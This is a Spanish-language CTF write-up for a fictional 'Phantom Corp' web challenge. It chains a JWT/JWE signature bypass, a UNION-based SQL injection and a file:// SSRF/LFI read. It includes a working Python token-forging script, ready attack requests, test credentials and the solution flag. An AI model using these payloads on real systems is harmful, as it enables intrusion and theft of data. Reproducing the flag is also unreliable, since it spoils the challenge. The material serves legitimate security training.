# 🏴 Phantom Corp — CTF Writeup

**Categoría:** Web (Hard)  
**Flag:** `flag{ph4nt0m_c0rp_jw3_sql1_ssrf_2026_m4st3r}`  
**CVEs:** CVE-2026-29000, CVE-2026-30881, CVE-2026-23850

---

## Descripción

Phantom Corp es una empresa ficticia de ciberseguridad. Su plataforma interna tiene una cadena de vulnerabilidades basadas en **3 CVEs reales del 2026** que, encadenadas, permiten al atacante obtener acceso administrativo, extraer secretos de la base de datos y leer archivos sensibles del servidor.

---

## Stage 0: Reconocimiento

### robots.txt
```
GET /robots.txt
```
Revela:
- `Disallow: /.well-known/` → Hay un directorio `.well-known`
- `Disallow: /admin/notes/preview` → Endpoint de preview de notas
- `Disallow: /admin/api/` → Endpoints API
- Comentario: `Auth tokens use JWE + JWS (RSA-OAEP-256)`
- Pista: `See /.well-known/jwks.json for public key distribution`

### JWKS Endpoint
```
GET /.well-known/jwks.json
```
Devuelve la clave pública RSA en formato JWKS:
```json
{
  "keys": [{
    "kty": "RSA",
    "alg": "RSA-OAEP-256",
    "kid": "phantom-corp-key-1",
    "use": "enc",
    "n": "...",
    "e": "AQAB"
  }]
}
```

### Consola del navegador
Al abrir la consola JavaScript, aparece un easter egg con pistas sobre la autenticación.

### Login de prueba
- Credenciales: `employee` / `corp2026!` (rol: user, sin acceso admin)
- El token de sesión es un JWE (5 partes separadas por `.`)

---

## Stage 1: CVE-2026-29000 — JWT Authentication Bypass

### Vulnerabilidad
El servidor usa un esquema de autenticación JWT de doble capa:
1. **JWS** (firmado con RS256) para integridad
2. **JWE** (cifrado con RSA-OAEP-256 + A256GCM) para confidencialidad

El bug está en cómo el servidor verifica los tokens:
1. Descifra el JWE con su clave privada
2. Intenta parsear el payload interior como JWS
3. **Si el payload es un PlainJWT (alg: none), devuelve `None`**
4. El código verifica `if signed_jwt is not None:` antes de validar la firma
5. Si es None → **se salta TODA la verificación de firma**
6. Extrae los claims directamente sin validar

### Exploit
```python
from jwcrypto import jwk, jwe
import json, base64, time

# 1. Obtener clave pública
r = requests.get('http://TARGET/.well-known/jwks.json')
pub_key = jwk.JWK(**r.json()['keys'][0])

# 2. Crear PlainJWT (sin firma)
def b64url(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header = json.dumps({'alg': 'none', 'typ': 'JWT'})
claims = json.dumps({
    'sub': 'phantom_admin', 'role': 'admin',
    'iat': int(time.time()), 'exp': int(time.time()) + 86400
})
plain_jwt = b64url(header) + '.' + b64url(claims) + '.'

# 3. Envolver en JWE con la clave pública
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({'alg': 'RSA-OAEP-256', 'enc': 'A256GCM'})
)
forged_token = jwe_token.serialize(compact=True)

# 4. Usar como cookie session_token → acceso admin
```

---

## Stage 2: CVE-2026-30881 — SQL Injection

### Vulnerabilidad
El endpoint `/admin/api/stats` tiene una sanitización rota heredada de Chamilo LMS:

```python
# Paso 1: "Escapa" comillas simples
date_end = date_end.replace("'", "\\'")

# Paso 2: ¡DESHACE EL ESCAPE!
date_end = date_end.replace("\\'", "'")

# Resultado: las comillas pasan sin cambios → SQLi
query = f"SELECT ... WHERE timestamp <= '{date_end}' ..."
```

### Exploit (UNION-based)
```
GET /admin/api/stats?date_start=2026-01-01&date_end=' UNION SELECT 1, content FROM secret_notes WHERE is_hidden=1 --
```

### Resultado
Extrae una nota oculta que revela:
- El endpoint `/admin/notes/preview` acepta `file://` URIs
- La flag está en `/opt/phantom/flag.txt`
- El parámetro es `source_url`

---

## Stage 3: CVE-2026-23850 — SSRF/LFI

### Vulnerabilidad
El markdown renderer acepta un parámetro `source_url` que permite especificar una URL de donde obtener el contenido. Soporta el esquema `file://` sin ninguna restricción de ruta, permitiendo lectura arbitraria de archivos del servidor.

### Exploit
```
POST /admin/notes/preview
Content-Type: application/x-www-form-urlencoded

source_url=file:///opt/phantom/flag.txt&content=
```

### Flag
```
flag{ph4nt0m_c0rp_jw3_sql1_ssrf_2026_m4st3r}
```

---

## Herramientas Necesarias
- Python 3 con `jwcrypto` y `requests`
- Cualquier interceptor HTTP (Burp Suite, etc.)
- Conocimiento de JWT/JWE, SQL injection y SSRF

## Dificultad: Hard
- Requiere entender criptografía JWT de doble capa (JWE + JWS)
- La SQLi usa un patrón real de un CVE (no un SQLi genérico)
- La cadena de 3 pasos requiere conectar información entre stages
